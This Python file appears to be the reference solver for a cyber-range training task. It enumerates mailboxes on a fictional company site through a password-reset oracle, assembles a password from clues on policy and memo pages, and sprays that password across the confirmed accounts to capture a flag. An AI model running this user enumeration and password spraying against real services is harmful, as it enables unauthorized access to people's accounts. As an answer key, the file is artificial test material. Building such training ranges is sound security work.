"""Intended-path solver: enumerate mailboxes, assemble the password, spray."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

EMAIL_RE = re.compile(r"[a-z0-9._+-]+@harborview\.example")
THEME_RE = re.compile(r"theme word is (\w+)")
MASCOT_RE = re.compile(r"mascot vote returned (\w+)")
BUILDING_RE = re.compile(r"building number is (\d{2})")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url("target")

    policy = httpx.get(f"{base}/policy", timeout=10).text
    memo = httpx.get(f"{base}/memo", timeout=10).text
    theme = THEME_RE.search(policy)
    mascot = MASCOT_RE.search(memo)
    building = BUILDING_RE.search(memo)
    if not (theme and mascot and building):
        return SolveResult(
            results=[
                TaskResult(
                    task_id="disciplined-spray",
                    ok=False,
                    detail="could not assemble password from policy and memo",
                )
            ]
        )
    password = theme.group(1) + mascot.group(1) + building.group(1)

    directory = httpx.get(f"{base}/directory", timeout=10).text
    addresses = sorted(set(EMAIL_RE.findall(directory)))

    confirmed: list[str] = []
    for address in addresses:
        res = httpx.post(f"{base}/forgot", data={"email": address}, timeout=10)
        if "queued" in res.text:
            confirmed.append(address)
    if not confirmed:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="disciplined-spray",
                    ok=False,
                    detail="reset oracle confirmed no mailboxes",
                )
            ]
        )

    # Spray discipline: at most one attempt per account per candidate.
    for address in confirmed:
        res = httpx.post(
            f"{base}/login",
            data={"username": address, "password": password},
            timeout=10,
        )
        flags = find_flags(res.text)
        if flags:
            detail = (
                f"sprayed {password!r} across {len(confirmed)} confirmed "
                "mailboxes, one attempt each; success on first hit"
            )
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="disciplined-spray",
                        ok=True,
                        captured=flags[0],
                        detail=detail,
                    )
                ]
            )

    return SolveResult(
        results=[
            TaskResult(
                task_id="disciplined-spray",
                ok=False,
                detail=(
                    f"password {password!r} rejected by all {len(confirmed)} confirmed mailboxes"
                ),
            )
        ]
    )
